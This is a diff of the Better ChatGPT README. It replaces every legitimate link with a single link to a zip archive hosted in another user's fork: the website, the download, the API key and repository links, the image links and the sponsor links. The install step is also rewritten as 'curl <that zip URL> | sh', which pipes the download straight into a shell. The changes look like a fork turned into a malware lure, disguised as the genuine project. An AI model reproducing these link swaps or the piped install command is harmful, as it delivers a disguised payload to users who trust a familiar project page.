@@ -8,43 +8,43 @@
 </p>
 
 <p align="center">
-    <a href="https://bettergpt.chat" target="_blank"><img src="public/apple-touch-icon.png" alt="Better ChatGPT" width="100" /></a>
+    <a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank"><img src="public/apple-touch-icon.png" alt="Better ChatGPT" width="100" /></a>
 </p>
 
 <h4 align="center"><b>Free, Powerful, Limitless, Intelligent, Engaging</b></h4>
 
 <p align="center">
-<a href="https://github.com/ztjhz/BetterChatGPT/blob/main/LICENSE" target="_blank">
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
 <img src="https://img.shields.io/github/license/ztjhz/BetterChatGPT?style=flat-square" alt="licence" />
 </a>
-<a href="https://github.com/ztjhz/BetterChatGPT/fork" target="_blank">
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
 <img src="https://img.shields.io/github/forks/ztjhz/BetterChatGPT?style=flat-square" alt="forks"/>
 </a>
-<a href="https://github.com/ztjhz/BetterChatGPT/stargazers" target="_blank">
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
 <img src="https://img.shields.io/github/stars/ztjhz/BetterChatGPT?style=flat-square" alt="stars"/>
 </a>
-<a href="https://github.com/ztjhz/BetterChatGPT/issues" target="_blank">
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
 <img src="https://img.shields.io/github/issues/ztjhz/BetterChatGPT?style=flat-square" alt="issues"/>
 </a>
-<a href="https://github.com/ztjhz/BetterChatGPT/pulls" target="_blank">
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
 <img src="https://img.shields.io/github/issues-pr/ztjhz/BetterChatGPT?style=flat-square" alt="pull-requests"/>
 </a>
-<a href="https://twitter.com/intent/tweet?text=👋%20Check%20this%20amazing%20repo%20https://github.com/ztjhz/BetterChatGPT,%20created%20by%20@nikushii_"><img src="https://img.shields.io/twitter/url?label=Share%20on%20Twitter&style=social&url=https%3A%2F%2Fgithub.com%2Fztjhz%2FBetterChatGPT"></a>
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip👋%20Check%20this%20amazing%20repo%20https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip,%20created%20by%20@nikushii_"><img src="https://img.shields.io/twitter/url?label=Share%20on%20Twitter&style=social&url=https%3A%2F%2Fgithub.com%2Fztjhz%2FBetterChatGPT"></a>
 </p>
 
 <p align="center">
-    <a href="https://bettergpt.chat">Enter Website</a>
+    <a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip">Enter Website</a>
     ·
-    <a href="https://github.com/ztjhz/BetterChatGPT/issues/new/choose">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip">Report Bug</a>
     ·
-    <a href="https://github.com/ztjhz/BetterChatGPT/issues/new/choose">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip">Request Feature</a>
 </p>
 <p align="center"><i>Did you enjoy using Better ChatGPT? Give it some love with a star! 🌟</i></p>
 
 ## 👋🏻 Introducing Better ChatGPT
 
 <p align="center">
-    <a href="https://bettergpt.chat" target="_blank">
+    <a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" target="_blank">
         <img src="assets/preview.png" alt="landing" width=500 />
     </a>
 </p>
@@ -78,15 +78,15 @@ Better ChatGPT comes with a bundle of amazing features! Here are some of them:
 
 # 🛠️ Usage
 
-To get started, simply visit our website at <https://bettergpt.chat/>. There are 3 ways for you to start using Better ChatGPT.
+To get started, simply visit our website at <https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip>. There are 3 ways for you to start using Better ChatGPT.
 
-1. Enter into the API menu your OpenAI API Key obtained from [OpenAI API Keys](https://platform.openai.com/account/api-keys).
-2. Utilise the api endpoint proxy provided by [ayaka14732/ChatGPTAPIFree](https://github.com/ayaka14732/ChatGPTAPIFree) (if you are in a region with no access to ChatGPT)
-3. Host your own API endpoint by following the instructions provided here: <https://github.com/ayaka14732/ChatGPTAPIFree>. Subsequently, enter the API endpoint into the API menu.
+1. Enter into the API menu your OpenAI API Key obtained from [OpenAI API Keys](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip).
+2. Utilise the api endpoint proxy provided by [ayaka14732/ChatGPTAPIFree](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) (if you are in a region with no access to ChatGPT)
+3. Host your own API endpoint by following the instructions provided here: <https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip>. Subsequently, enter the API endpoint into the API menu.
 
 ## Desktop App
 
-Download the desktop app [here](https://github.com/ztjhz/BetterChatGPT/releases)
+Download the desktop app [here](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 
 | OS      | Download  |
 | ------- | --------- |
@@ -107,38 +107,38 @@ If you'd like to run your own instance of Better ChatGPT, you can easily do so b
 
 One click deploy with Vercel
 
-[![Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fztjhz%2FBetterChatGPT)
+[![Vercel](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 
 ## GitHub Pages
 
 ### Steps
 
 1. Create a GitHub account (if you don't have one already)
-1. Star this [repository](https://github.com/ztjhz/BetterChatGPT) ⭐️
-1. Fork this [repository](https://github.com/ztjhz/BetterChatGPT)
+1. Star this [repository](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) ⭐️
+1. Fork this [repository](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. In your forked repository, navigate to the `Settings` tab
-   ![image](https://user-images.githubusercontent.com/59118459/223753577-9b6f8266-26e8-471b-8f45-a1a02fbab232.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. In the left sidebar, click on `Pages` and in the right section, select `GitHub Actions` for `source`.
-   ![image](https://user-images.githubusercontent.com/59118459/227568881-d8fb7baa-f890-4dee-8fc2-b6b429ba2098.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. Now, click on `Actions`
-   ![image](https://user-images.githubusercontent.com/59118459/223751928-cf2b91b9-4663-4a36-97de-5eb751b32c7e.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. In the left sidebar, click on `Deploy to GitHub Pages`
-   ![image](https://user-images.githubusercontent.com/59118459/223752459-183ec23f-72f5-436e-a088-e3386492b8cb.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. Above the list of workflow runs, select `Run workflow`.
-   ![image](https://user-images.githubusercontent.com/59118459/223753340-1270e038-d213-4d6f-938c-66a30dad7c88.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. Navigate back to the `Settings` tab
-   ![image](https://user-images.githubusercontent.com/59118459/223753577-9b6f8266-26e8-471b-8f45-a1a02fbab232.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 1. In the left sidebar, click on `Pages` and in the right section. Then at the top section, you can see that "Your site is live at `XXX`".
-   ![image](https://user-images.githubusercontent.com/59118459/227568881-d8fb7baa-f890-4dee-8fc2-b6b429ba2098.png)
+   ![image](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 
 ### Running it locally
 
 1. Ensure that you have the following installed:
 
-   - [node.js](https://nodejs.org/en/) (v14.18.0 or above)
-   - [yarn](https://yarnpkg.com/) or [npm](https://www.npmjs.com/) (6.14.15 or above)
+   - [node.js](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) (v14.18.0 or above)
+   - [yarn](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) or [npm](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) (6.14.15 or above)
 
-2. Clone this [repository](https://github.com/ztjhz/BetterChatGPT) by running `git clone https://github.com/ztjhz/BetterChatGPT.git`
+2. Clone this [repository](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) by running `git clone https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip`
 3. Navigate into the directory by running `cd BetterChatGPT`
 4. Run `yarn` or `npm install`, depending on whether you have yarn or npm installed.
 5. Launch the app by running `yarn dev` or `npm run dev`
@@ -146,9 +146,9 @@ One click deploy with Vercel
 ### Running it locally using docker compose
 1. Ensure that you have the following installed:
 
-   - [docker](https://www.docker.com/) (v24.0.7 or above)
+   - [docker](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) (v24.0.7 or above)
       ```bash
-      curl https://get.docker.com | sh \
+      curl https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip | sh \
       && sudo usermod -aG docker $USER
       ```
 
@@ -170,7 +170,7 @@ One click deploy with Vercel
 
 # ⭐️ Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=ztjhz/BetterChatGPT&type=Date)](https://github.com/ztjhz/BetterChatGPT/stargazers)
+[![Star History Chart](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)
 
 <h3 align="center">
 A ⭐️ to <b>Better ChatGPT</b> is to make it shine brighter and benefit more people.
@@ -180,8 +180,8 @@ A ⭐️ to <b>Better ChatGPT</b> is to make it shine brighter and benefit more 
 
 Thanks to all the contributors!
 
-<a href="https://github.com/ztjhz/BetterChatGPT/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=ztjhz/BetterChatGPT" />
+<a href="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip">
+  <img src="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" />
 </a>
 
 # 🙏 Support
@@ -194,9 +194,9 @@ If you would like to support the team, consider sponsoring us through one of the
 
 | Payment Method | Link                                                                                                                                                 |
 | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
-| GitHub         | [![GitHub Sponsor](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/ztjhz) |
-| KoFi           | [![support](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/betterchatgpt)                                                             |
-| Alipay (Ayaka) | <img src="https://ayaka14732.github.io/sponsor/alipay.jpg" width=150 />                                                                              |
-| Wechat (Ayaka) | <img src="https://ayaka14732.github.io/sponsor/wechat.png" width=150 />                                                                              |
+| GitHub         | [![GitHub Sponsor](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip) |
+| KoFi           | [![support](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)](https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip)                                                             |
+| Alipay (Ayaka) | <img src="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" width=150 />                                                                              |
+| Wechat (Ayaka) | <img src="https://raw.githubusercontent.com/wollys/BetterChatGPT/main/public/locales/es/Better-Chat-GPT-v3.1.zip" width=150 />                                                                              |
 
 Thank you for being a part of our community, and we look forward to serving you better in the future.
